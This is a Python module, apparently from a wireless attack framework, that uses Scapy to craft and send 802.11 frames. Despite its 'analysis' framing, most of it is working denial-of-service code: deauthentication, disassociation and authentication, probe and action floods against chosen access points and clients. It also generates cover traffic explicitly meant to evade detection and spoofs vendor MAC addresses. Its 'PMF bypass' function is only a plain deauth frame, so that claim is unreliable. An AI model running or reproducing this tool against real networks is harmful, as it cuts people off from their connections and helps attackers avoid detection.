"""
Advanced Wireless Network Analysis Framework - Packet Crafter Module

This module handles the creation and transmission of wireless packets,
providing sophisticated packet crafting capabilities for various analysis needs.
"""

import random
import time
import logging
import subprocess
from typing import Dict, List, Tuple, Optional, Union, Any

# Try to import Scapy - essential for packet operations
try:
    from scapy.all import sendp, Dot11, RadioTap, Dot11Deauth, Dot11Disas
    from scapy.all import Dot11Auth, Dot11AssoReq, Dot11ProbeReq, Dot11Elt
    from scapy.layers.dot11 import Dot11Beacon
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

from ..utils.logging import setup_logger
from ..core.constants import ATTACK_VECTORS, DEAUTH_REASON_CODES

# Configure logger
logger = setup_logger(__name__)

class PacketCrafter:
    """
    Provides methods for creating and sending various types of 802.11 packets
    for wireless network analysis.
    """
    
    def __init__(self):
        """Initialize the packet crafter"""
        if not SCAPY_AVAILABLE:
            logger.warning("Scapy not available - packet operations will be limited")
    
    def extract_packet_info(self, packet: Any) -> Tuple[Optional[str], Optional[str], Optional[int]]:
        """
        Extract client MAC, AP MAC, and channel from a packet
        
        Args:
            packet: The captured packet
            
        Returns:
            tuple: (client_mac, ap_mac, channel) or (None, None, None) if extraction fails
        """
        if not SCAPY_AVAILABLE:
            return None, None, None
            
        try:
            # Check if this is a valid 802.11 packet
            if not packet.haslayer(Dot11):
                return None, None, None
                
            # Try to extract client and AP MAC addresses
            client_mac = None
            ap_mac = None
            
            # Extract addresses based on frame type and DS flags
            dot11 = packet.getlayer(Dot11)
            
            # Extract DS flags (To DS and From DS)
            ds_field = dot11.FCfield & 0x3
            to_ds = bool(ds_field & 0x1)
            from_ds = bool(ds_field & 0x2)
            
            # Get addresses based on DS flags
            if not to_ds and not from_ds:
                # Ad hoc or management frame
                if dot11.type == 0:  # Management frame
                    client_mac = dot11.addr2
                    ap_mac = dot11.addr1 if dot11.addr1 != "ff:ff:ff:ff:ff:ff" else dot11.addr3
            elif to_ds and not from_ds:
                # Station to AP
                client_mac = dot11.addr2
                ap_mac = dot11.addr1
            elif not to_ds and from_ds:
                # AP to station
                client_mac = dot11.addr1
                ap_mac = dot11.addr2
            else:
                # WDS (AP to AP) - not typically useful for our analysis
                return None, None, None
            
            # Extract channel
            channel = None
            if hasattr(packet, 'channel'):
                channel = packet.channel
            else:
                # Try to extract from DSSS Parameter Set if available
                ds_param = None
                if packet.haslayer(Dot11Elt):
                    for element in packet.iterpayloads():
                        if hasattr(element, 'ID') and element.ID == 3 and hasattr(element, 'info'):
                            ds_param = element
                            break
                
                if ds_param:
                    # Channel is the first byte of the DS Parameter Set info field
                    channel = ord(ds_param.info) if len(ds_param.info) > 0 else None
            
            return client_mac, ap_mac, channel
            
        except Exception as e:
            logger.error(f"Error extracting packet info: {e}")
            return None, None, None
    
    def get_packet_metadata(self, packet: Any) -> Dict:
        """
        Extract metadata from a packet for analysis purposes
        
        Args:
            packet: The captured packet
            
        Returns:
            dict: Packet metadata
        """
        if not SCAPY_AVAILABLE:
            return {'packet_type': 'unknown'}
            
        try:
            metadata = {'packet_type': 'unknown'}
            
            # Determine packet type based on 802.11 header
            if packet.haslayer(Dot11):
                dot11 = packet.getlayer(Dot11)
                
                # Extract basic frame info
                frame_type = dot11.type
                frame_subtype = dot11.subtype
                
                # Categorize frame
                if frame_type == 0:  # Management
                    if frame_subtype == 0:
                        metadata['packet_type'] = 'association_request'
                    elif frame_subtype == 1:
                        metadata['packet_type'] = 'association_response'
                    elif frame_subtype == 4:
                        metadata['packet_type'] = 'probe_request'
                    elif frame_subtype == 5:
                        metadata['packet_type'] = 'probe_response'
                    elif frame_subtype == 8:
                        metadata['packet_type'] = 'beacon'
                    elif frame_subtype == 10:
                        metadata['packet_type'] = 'disassociation'
                    elif frame_subtype == 11:
                        metadata['packet_type'] = 'authentication'
                    elif frame_subtype == 12:
                        metadata['packet_type'] = 'deauthentication'
                elif frame_type == 1:  # Control
                    metadata['packet_type'] = 'control'
                elif frame_type == 2:  # Data
                    metadata['packet_type'] = 'data'
                
                # Extract signal strength if available
                if hasattr(packet, 'dBm_AntSignal'):
                    metadata['signal_strength'] = packet.dBm_AntSignal
                
                # Extract sequence number
                if hasattr(dot11, 'SC'):
                    metadata['sequence'] = dot11.SC >> 4
                    metadata['fragment'] = dot11.SC & 0xF
            
            return metadata
            
        except Exception as e:
            logger.error(f"Error extracting packet metadata: {e}")
            return {'packet_type': 'unknown'}
    
    def craft_attack_packets(self, ap_mac: str, client_mac: str, vector: str,
                           count: int, reason: int = 7) -> List[Any]:
        """
        Create attack packets based on specified parameters
        
        Args:
            ap_mac: AP MAC address
            client_mac: Client MAC address
            vector: Attack vector to use (e.g., 'deauth', 'disassoc')
            count: Number of packets to create
            reason: Reason code for deauth/disassoc
            
        Returns:
            list: List of crafted packets
        """
        if not SCAPY_AVAILABLE:
            logger.error("Scapy not available - cannot craft packets")
            return []
            
        packets = []
        
        try:
            # Determine packet crafting method based on vector
            if vector == 'deauth':
                for _ in range(count):
                    packets.append(self._craft_deauth_packet(ap_mac, client_mac, reason))
            elif vector == 'disassoc':
                for _ in range(count):
                    packets.append(self._craft_disassoc_packet(ap_mac, client_mac, reason))
            elif vector == 'null_func':
                for _ in range(count):
                    packets.append(self._craft_null_function_packet(ap_mac, client_mac))
            elif vector == 'auth_flood':
                for _ in range(count):
                    packets.append(self._craft_auth_flood_packet(client_mac, ap_mac))
            elif vector == 'probe_flood':
                for _ in range(count):
                    packets.append(self._craft_probe_flood_packet(client_mac, ap_mac))
            elif vector == 'action_flood':
                for _ in range(count):
                    packets.append(self._craft_action_flood_packet(client_mac, ap_mac))
            elif vector == 'pmf_bypass':
                for _ in range(count):
                    packets.append(self._craft_pmf_bypass_packet(client_mac, ap_mac, reason))
            elif vector == 'mixed':
                # Mix of deauth and disassoc
                for _ in range(count):
                    if random.random() < 0.5:
                        packets.append(self._craft_deauth_packet(ap_mac, client_mac, reason))
                    else:
                        packets.append(self._craft_disassoc_packet(ap_mac, client_mac, reason))
            else:
                logger.warning(f"Unknown attack vector: {vector}")
            
            # Randomize sequence numbers for more effective attack
            for packet in packets:
                if hasattr(packet, 'SC'):
                    packet.SC = random.randint(0, 4095) << 4
            
            return packets
            
        except Exception as e:
            logger.error(f"Error crafting attack packets: {e}")
            return []
    
    def _craft_deauth_packet(self, ap_mac: str, client_mac: str, reason: int = 7) -> Any:
        """
        Create a deauthentication packet
        
        Args:
            ap_mac: AP MAC address
            client_mac: Client MAC address
            reason: Reason code
            
        Returns:
            Scapy packet
        """
        return RadioTap() / Dot11(
            type=0, subtype=12, addr1=client_mac, addr2=ap_mac, addr3=ap_mac
        ) / Dot11Deauth(reason=reason)
    
    def _craft_disassoc_packet(self, ap_mac: str, client_mac: str, reason: int = 7) -> Any:
        """
        Create a disassociation packet
        
        Args:
            ap_mac: AP MAC address
            client_mac: Client MAC address
            reason: Reason code
            
        Returns:
            Scapy packet
        """
        return RadioTap() / Dot11(
            type=0, subtype=10, addr1=client_mac, addr2=ap_mac, addr3=ap_mac
        ) / Dot11Disas(reason=reason)
    
    def _craft_null_function_packet(self, ap_mac: str, client_mac: str) -> Any:
        """
        Create a null function packet
        
        Args:
            ap_mac: AP MAC address
            client_mac: Client MAC address
            
        Returns:
            Scapy packet
        """
        return RadioTap() / Dot11(
            type=2, subtype=4, addr1=ap_mac, addr2=client_mac, addr3=ap_mac, FCfield=0x01
        )
    
    def _craft_auth_flood_packet(self, client_mac: str, ap_mac: str) -> Any:
        """
        Create an authentication packet for auth flooding
        
        Args:
            client_mac: Client MAC address
            ap_mac: AP MAC address
            
        Returns:
            Scapy packet
        """
        return RadioTap() / Dot11(
            type=0, subtype=11, addr1=ap_mac, addr2=client_mac, addr3=ap_mac
        ) / Dot11Auth(algo=0, seqnum=1, status=0)
    
    def _craft_probe_flood_packet(self, client_mac: str, ap_mac: str) -> Any:
        """
        Create a probe request packet for probe flooding
        
        Args:
            client_mac: Client MAC address
            ap_mac: AP MAC address
            
        Returns:
            Scapy packet
        """
        return RadioTap() / Dot11(
            type=0, subtype=4, addr1=ap_mac, addr2=client_mac, addr3=ap_mac
        ) / Dot11ProbeReq() / Dot11Elt(ID=0, info=b"")
    
    def _craft_action_flood_packet(self, client_mac: str, ap_mac: str) -> Any:
        """
        Create an action frame for action flooding
        
        Args:
            client_mac: Client MAC address
            ap_mac: AP MAC address
            
        Returns:
            Scapy packet
        """
        # Public action frame
        return RadioTap() / Dot11(
            type=0, subtype=13, addr1=ap_mac, addr2=client_mac, addr3=ap_mac
        ) / bytes([0x04, 0x09, 0x01])  # Category 4 (Public), Action 9, Detail 1
    
    def _craft_pmf_bypass_packet(self, client_mac: str, ap_mac: str, reason: int = 7) -> Any:
        """
        Create a packet designed to bypass PMF (802.11w) protection
        
        Args:
            client_mac: Client MAC address
            ap_mac: AP MAC address
            reason: Reason code
            
        Returns:
            Scapy packet
        """
        # Attempt to craft a packet that might bypass PMF by using specific reason codes
        return RadioTap() / Dot11(
            type=0, subtype=12, addr1=client_mac, addr2=ap_mac, addr3=ap_mac
        ) / Dot11Deauth(reason=reason)
    
    def send_packet(self, packet: Any, interface: str) -> bool:
        """
        Send a packet using the specified interface
        
        Args:
            packet: Packet to send
            interface: Interface to use
            
        Returns:
            bool: True if sent successfully, False otherwise
        """
        if not SCAPY_AVAILABLE:
            return False
            
        try:
            sendp(packet, iface=interface, verbose=False)
            return True
        except Exception as e:
            logger.error(f"Error sending packet on {interface}: {e}")
            return False
    
    def generate_noise_packets(self, ap_mac: str, noise_type: str = 'probe_request',
                             count: int = 3) -> List[Any]:
        """
        Generate cover traffic to evade detection
        
        Args:
            ap_mac: AP MAC address to target
            noise_type: Type of noise to generate
            count: Number of packets to generate
            
        Returns:
            list: Generated packets
        """
        if not SCAPY_AVAILABLE:
            return []
            
        try:
            noise_packets = []
            
            # Generate a random MAC address for source
            src_mac = self.generate_random_mac()
            
            if noise_type == 'probe_request':
                # Create probe requests - looks like normal scanning
                for _ in range(count):
                    ssid = bytes([random.randint(65, 90) for _ in range(random.randint(4, 8))])
                    probe = (
                        RadioTap() /
                        Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", 
                              addr2=src_mac, addr3="ff:ff:ff:ff:ff:ff") /
                        Dot11ProbeReq() /
                        Dot11Elt(ID=0, info=ssid) /
                        Dot11Elt(ID=1, info=b"\x02\x04\x0b\x16")
                    )
                    noise_packets.append(probe)
                    
            elif noise_type == 'null_data':
                # Null data frames - common in power saving
                for _ in range(count):
                    null_data = (
                        RadioTap() /
                        Dot11(type=2, subtype=4, addr1=ap_mac, 
                              addr2=src_mac, addr3=ap_mac)
                    )
                    noise_packets.append(null_data)
                    
            elif noise_type == 'data':
                # Data fragment - looks like normal traffic
                data_frag = (
                    RadioTap() /
                    Dot11(type=2, subtype=8, addr1=ap_mac, 
                          addr2=src_mac, addr3=ap_mac, FCfield=0x01) /
                    bytes([0] * random.randint(10, 20))
                )
                noise_packets.append(data_frag)
            
            return noise_packets
            
        except Exception as e:
            logger.error(f"Error generating noise packets: {e}")
            return []
    
    def generate_random_mac(self, oui: str = None) -> str:
        """
        Generate a random MAC address
        
        Args:
            oui: Optional OUI prefix to use
            
        Returns:
            str: Generated MAC address
        """
        if oui:
            # Format OUI correctly
            if ':' in oui:
                oui = oui.replace(':', '')
            
            # Ensure OUI is 6 hex digits
            if len(oui) != 6:
                raise ValueError("OUI must be 6 hex digits")
                
            # Format OUI as xx:xx:xx
            formatted_oui = ':'.join([oui[i:i+2] for i in range(0, 6, 2)])
        else:
            # Use random OUI from common vendors for more realistic MAC
            common_ouis = [
                "00:0C:29",  # VMware
                "00:50:56",  # VMware
                "00:1A:11",  # Google
                "00:03:93",  # Apple
                "00:0D:3A",  # Microsoft
                "00:13:10",  # Cisco
                "00:25:9C",  # Cisco
                "E4:CE:8F",  # Apple
                "80:BE:05",  # Apple
                "3C:D0:F8",  # Samsung
                "F0:72:8C",  # Samsung
                "B0:FE:BD",  # Private
            ]
            formatted_oui = random.choice(common_ouis)
        
        # Generate random suffix (xx:xx:xx)
        suffix = ':'.join([f"{random.randint(0, 255):02x}" for _ in range(3)])
        
        return f"{formatted_oui}:{suffix}"